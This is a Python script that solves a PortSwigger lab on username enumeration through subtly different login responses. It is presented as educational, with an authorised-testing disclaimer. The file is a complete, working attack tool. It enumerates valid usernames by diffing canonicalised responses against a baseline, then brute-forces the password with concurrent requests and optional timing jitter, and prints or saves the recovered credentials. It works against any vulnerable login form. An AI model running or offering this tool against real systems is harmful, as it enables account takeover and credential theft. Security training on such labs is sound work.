#!/usr/bin/env python3
# Copyright (c) 2026 cyberprophetTV. Licensed under the MIT License (see LICENSE).
#
# FOR EDUCATIONAL USE ONLY.
# Intended for solving PortSwigger Web Security Academy labs and for
# use against systems you OWN or have EXPLICIT WRITTEN PERMISSION to
# test. Running this against unauthorized systems is illegal in most
# jurisdictions (CFAA in the US, Computer Misuse Act in the UK, etc).
# You are responsible for ensuring your use is lawful. See README.
"""
=====================================================================
Solver for PortSwigger lab:
  "Username enumeration via subtly different responses"
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
=====================================================================

WHY THIS LAB IS HARDER THAN THE "DIFFERENT RESPONSES" LAB
---------------------------------------------------------
The original "different responses" lab leaks via OBVIOUS signal:
  - Invalid username -> "Invalid username"  (length 3168)
  - Valid username   -> "Incorrect password" (length 3170)

Two completely different error messages, two different body lengths.
A response-length fingerprint solves it in one pass.

THIS lab is sneakier. The server uses one phrase for invalid users
and a slightly different one for valid users - for example:
    Invalid username: "Invalid username or password."   (with period)
    Valid username:   "Invalid username or password"    (no period)

That's a one-byte difference. The body length differs by 1. A naive
length fingerprint MAY still spot it - but in practice the response
also contains dynamic content (CSRF tokens, sometimes timestamps),
so per-request lengths jitter by a few bytes anyway. The "real"
1-byte signal gets swallowed by noise. You need a smarter comparison.

THE APPROACH
------------
1. Fetch a BASELINE response using a username we KNOW is invalid
   (something like a random UUID - astronomically unlikely to be a
   real user account).
2. Send a probe for each candidate username with a junk password.
3. CANONICALIZE both bodies (strip dynamic noise like CSRF tokens)
   before comparison.
4. Compute a similarity score against the baseline using
   difflib.SequenceMatcher. The valid username's response will be
   noticeably LESS similar than the invalid ones, even if only by
   1 character.
5. Report the candidate with the lowest similarity ratio.

ABOUT CANONICALIZATION
----------------------
Many real apps embed per-request dynamic content in their HTML:
  - <input name="csrf" value="ABC123..."> - a random token
  - <script>window.requestId = '...';</script> - tracing ID
  - Cache-Control or ETag headers
  - <!-- generated at 2026-05-28T17:00:00Z --> - timestamp
  - Session ID reflected in a hidden field

If we compare bodies byte-for-byte, every request will look different
because of these - and the real 1-byte vulnerability signal gets
lost in the noise. The fix is to STRIP those dynamic parts before
diffing.

This script strips the most common pattern - CSRF tokens. For other
patterns you'd add more regex substitutions in canonicalize().

ABOUT SequenceMatcher.ratio()
-----------------------------
Python's difflib computes a similarity ratio between two strings,
from 0.0 (completely different) to 1.0 (identical). For two strings
that differ by only 1 char out of 3000, ratio() is ~0.9997 - and
two truly identical strings will be exactly 1.0. The valid username's
ratio will be slightly below the baseline; the invalid usernames'
ratios will be ~1.0 (assuming our canonicalization removed the
dynamic noise correctly).

This is essentially the same algorithm `git diff` uses to align
changed regions - it computes the longest common subsequence.

WHEN THIS APPROACH FAILS
------------------------
- If canonicalization misses something dynamic, every probe will
  diff slightly and you'll get false positives. Inspect with
  --verbose to see what the bodies actually look like.
- If the lab uses a completely different page for valid users (not
  just a 1-char change), use the original username_enum_solver.py
  instead - it'll be faster.
"""

# ---------------------------------------------------------------------
# IMPORTS
# ---------------------------------------------------------------------
import argparse
import json
import random
import re
import sys
import time
import uuid                                      # random UUID for the baseline "definitely-invalid" username
from concurrent.futures import (
    ThreadPoolExecutor,
    as_completed,
)
from dataclasses import dataclass
from difflib import SequenceMatcher              # similarity scoring
from pathlib import Path
from urllib.parse import urlparse

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from _common import (
    tag_info, tag_ok, tag_warn, tag_err,
    progress, bold, dim,
)


# ---------------------------------------------------------------------
# CANONICALIZATION
# ---------------------------------------------------------------------
# Patterns we strip before comparing two responses, so per-request
# dynamic content (CSRF tokens, session IDs, etc.) doesn't drown out
# the real 1-byte vulnerability signal we're hunting for.
#
# Each entry is a (regex, replacement) pair. Add to this list if you
# encounter a lab with different dynamic markup.
CANONICALIZATION_PATTERNS: list[tuple[re.Pattern, str]] = [
    # PortSwigger CSRF token: <input ... name="csrf" value="abc123...">
    (re.compile(r'name=["\']?csrf["\']?\s+value=["\'][^"\']+["\']', re.IGNORECASE),
     'name="csrf" value="STRIPPED"'),
    # Just in case the order is swapped:
    (re.compile(r'value=["\'][^"\']+["\']\s+name=["\']?csrf["\']?', re.IGNORECASE),
     'value="STRIPPED" name="csrf"'),
    # Anti-CSRF tokens in script tags (rarer; defensive):
    (re.compile(r'window\._csrf\s*=\s*["\'][^"\']+["\']'),
     'window._csrf = "STRIPPED"'),
]


def canonicalize(html: str) -> str:
    """
    Apply every canonicalization pattern to `html`.

    The goal is to make two responses that DIFFER ONLY in per-request
    dynamic noise look identical - so any remaining difference (e.g.
    a missing period in the error message) is the real signal.
    """
    out = html
    for pattern, replacement in CANONICALIZATION_PATTERNS:
        out = pattern.sub(replacement, out)
    return out


# ---------------------------------------------------------------------
# JITTER + SESSION (duplicated from username_enum_solver for self-containment;
# see _common.py refactor notes in the README)
# ---------------------------------------------------------------------
def parse_jitter(s: str) -> tuple[float, float]:
    if "-" in s:
        lo, hi = s.split("-", 1)
        return float(lo), float(hi)
    v = float(s)
    return v, v


def maybe_jitter(jitter: tuple[float, float]) -> None:
    lo, hi = jitter
    if hi > 0:
        time.sleep(random.uniform(lo, hi))


def build_session(workers: int, proxy: str | None = None,
                  insecure: bool = False, retries: int = 2) -> requests.Session:
    """See username_enum_solver.build_session for the full docstring."""
    s = requests.Session()
    retry = Retry(
        total=retries, backoff_factor=0.5,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers, max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    if insecure:
        s.verify = False
    return s


def read_wordlist(path: Path) -> list[str]:
    return [w for w in (line.strip() for line in path.read_text().splitlines()) if w]


# ---------------------------------------------------------------------
# CONFIG
# ---------------------------------------------------------------------
@dataclass
class AttackConfig:
    base_url: str
    workers: int
    jitter: tuple[float, float]
    dummy_password: str
    proxy: str | None
    insecure: bool
    retries: int
    verbose: bool
    output: Path | None
    # How many "differences from baseline" qualify as a hit. Higher =
    # stricter. The default of 1 means "any difference at all";
    # canonicalization should have neutralized all the noise.
    diff_threshold: int = 1


# ---------------------------------------------------------------------
# PROBE
# ---------------------------------------------------------------------
def post_login(session: requests.Session, base_url: str,
               username: str, password: str) -> requests.Response:
    """Single login POST. allow_redirects=False so we see the raw 302/200."""
    return session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=20,
    )


# ---------------------------------------------------------------------
# MAIN ATTACK
# ---------------------------------------------------------------------
def find_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
    """
    Two stages here:

    1. BASELINE: send one probe with a known-invalid username (a fresh
       UUID, which obviously won't be a real account name). Save the
       canonicalized body - this is what an "invalid username" response
       looks like in this session.

    2. PROBES: for each candidate username, send a probe with a junk
       password. Canonicalize, compute similarity to baseline. The
       valid username will be the LEAST similar.
    """
    session = build_session(cfg.workers, cfg.proxy, cfg.insecure, cfg.retries)

    # ---- Baseline ----
    # Using a fresh UUID guarantees no collision with any real user
    # account. The chance of accidentally guessing a real username
    # this way is roughly 1 in 10^36.
    baseline_username = f"baseline-{uuid.uuid4()}"
    print(f"{tag_info()} fetching baseline with bogus username {baseline_username!r}")
    baseline_resp = post_login(session, cfg.base_url, baseline_username, cfg.dummy_password)
    baseline_body = canonicalize(baseline_resp.text)
    print(f"{tag_info()} baseline: status={baseline_resp.status_code}  "
          f"raw_len={len(baseline_resp.text)}  canon_len={len(baseline_body)}")

    if cfg.verbose:
        print(f"    --- baseline (canonicalized, truncated to 2 KB) ---")
        print("    " + baseline_body[:2000].replace("\n", "\n    "))
        print(f"    --- end of baseline ---")

    # ---- Probes ----
    # Each probe returns (username, similarity_ratio, char_diff_count,
    # canonicalized_body_for_optional_dump).
    results: dict[str, tuple[float, int, str]] = {}

    def probe(u: str):
        maybe_jitter(cfg.jitter)
        r = post_login(session, cfg.base_url, u, cfg.dummy_password)
        canon = canonicalize(r.text)

        # SequenceMatcher.ratio() returns the similarity in [0.0, 1.0].
        # For two strings that match perfectly, ratio() == 1.0; for
        # totally disjoint strings, it approaches 0.0. The lab's
        # 1-byte difference produces a ratio just under 1.0.
        sm = SequenceMatcher(None, baseline_body, canon, autojunk=False)
        ratio = sm.ratio()

        # Also compute a raw char-difference count using the
        # opcodes from SequenceMatcher. This gives a more
        # human-interpretable "differs by N characters" number.
        # opcodes() yields (tag, i1, i2, j1, j2) where tag is one
        # of 'equal'/'replace'/'delete'/'insert'.
        char_diff = 0
        for tag, i1, i2, j1, j2 in sm.get_opcodes():
            if tag == "equal":
                continue
            # For replace/delete/insert, count the length of the
            # differing region (max of the two sides).
            char_diff += max(i2 - i1, j2 - j1)

        return u, ratio, char_diff, canon

    print(f"{tag_info()} probing {len(usernames)} candidate usernames")
    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        futures = [ex.submit(probe, u) for u in usernames]
        for fut in progress(as_completed(futures), total=len(futures), desc="probing"):
            u, ratio, char_diff, canon = fut.result()
            results[u] = (ratio, char_diff, canon)

            if cfg.verbose:
                print(f"    probe {u!r}: ratio={ratio:.6f} char_diff={char_diff}")

    # ---- Pick the outlier ----
    # The valid username has the LOWEST similarity ratio to baseline.
    # Sort ascending by ratio - first entry is the most likely valid.
    sorted_results = sorted(results.items(), key=lambda kv: kv[1][0])

    # Print the top 5 candidates so the user can sanity-check.
    print(f"{tag_info()} top 5 outliers (lowest similarity to baseline):")
    for u, (ratio, char_diff, _) in sorted_results[:5]:
        print(f"    {u!r:30s}  ratio={ratio:.6f}  char_diff={char_diff}")

    # The most-likely valid username is the one with the largest
    # char_diff above our threshold. (We use char_diff rather than
    # ratio for the threshold because it's more interpretable.)
    best_user, (best_ratio, best_diff, _) = sorted_results[0]
    if best_diff < cfg.diff_threshold:
        print(f"{tag_err()} top candidate's diff ({best_diff}) is below threshold "
              f"({cfg.diff_threshold}) - canonicalization may need tuning, "
              f"or no enumeration vulnerability exists.")
        return None

    print(f"{tag_ok()} valid username: {bold(best_user)}  "
          f"(differs from baseline by {best_diff} chars, ratio {best_ratio:.6f})")
    return best_user


# ---------------------------------------------------------------------
# Phase 2: password brute-force (same as the original solver)
# ---------------------------------------------------------------------
def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> str | None:
    print(f"{tag_info()} phase 2: trying {len(passwords)} passwords against {username!r}")
    session = build_session(cfg.workers, cfg.proxy, cfg.insecure, cfg.retries)
    found: str | None = None

    def probe(p: str):
        maybe_jitter(cfg.jitter)
        r = post_login(session, cfg.base_url, username, p)
        return p, r.status_code, r.headers.get("Location", "")

    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        futures = {ex.submit(probe, p): p for p in passwords}
        for fut in progress(as_completed(futures), total=len(futures), desc="passwords"):
            p, status, location = fut.result()
            if status == 302:
                found = p
                print(f"{tag_ok()} password found: {p!r}  -> {location!r}")
                for f in futures:
                    f.cancel()
                break
    return found


# ---------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("base_url",
                    help="Lab URL, e.g. https://0a1b...web-security-academy.net")
    ap.add_argument("usernames", type=Path, help="Username wordlist")
    ap.add_argument("passwords", type=Path, help="Password wordlist")
    ap.add_argument("--workers", type=int, default=10,
                    help="Concurrent requests (default 10)")
    ap.add_argument("--jitter", type=parse_jitter, default=(0.0, 0.0),
                    metavar="MIN-MAX", help="Random delay before each request")
    ap.add_argument("--dummy-password",
                    default="not-a-real-password-correct-horse-battery-staple-2026",
                    help="Junk password for the Phase 1 probes")
    ap.add_argument("--diff-threshold", type=int, default=1,
                    help="Minimum char-diff vs baseline to count as a valid "
                         "username hit (default 1)")
    ap.add_argument("--proxy", metavar="URL",
                    help="HTTP proxy. 'burp' = http://127.0.0.1:8080. "
                         "Auto-enables --insecure.")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--retries", type=int, default=2,
                    help="Retry on connection error / 5xx (default 2)")
    ap.add_argument("--verbose", action="store_true",
                    help="Print every probe + dump baseline body")
    ap.add_argument("--output", type=Path, metavar="FILE.json",
                    help="Write JSON summary to this file")
    args = ap.parse_args()

    # Proxy shorthand + auto-insecure
    proxy = args.proxy
    insecure = args.insecure
    if proxy:
        if proxy.strip().lower() == "burp":
            proxy = "http://127.0.0.1:8080"
        elif "://" not in proxy:
            proxy = f"http://{proxy}"
        insecure = True
        print(f"{tag_info()} routing through proxy: {proxy} (TLS verification disabled)")
    if insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parsed = urlparse(args.base_url)
    if not parsed.scheme or not parsed.netloc:
        sys.exit(f"{tag_err()} base_url must include scheme + host")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cfg = AttackConfig(
        base_url=base, workers=args.workers, jitter=args.jitter,
        dummy_password=args.dummy_password, proxy=proxy, insecure=insecure,
        retries=args.retries, verbose=args.verbose, output=args.output,
        diff_threshold=args.diff_threshold,
    )

    usernames = read_wordlist(args.usernames)
    passwords = read_wordlist(args.passwords)

    user = find_username(cfg, usernames)
    if not user:
        sys.exit(1)
    pw = brute_password(cfg, user, passwords)
    if not pw:
        print(f"{tag_err()} no password matched.")
        sys.exit(1)

    print()
    print(f"=== credentials: {bold(user)}:{bold(pw)} ===")

    if cfg.output is not None:
        cfg.output.write_text(json.dumps({
            "lab_url": cfg.base_url,
            "valid_username": user,
            "password": pw,
            "credentials": f"{user}:{pw}",
        }, indent=2) + "\n")
        print(f"{tag_info()} wrote summary to {cfg.output}")


if __name__ == "__main__":
    main()
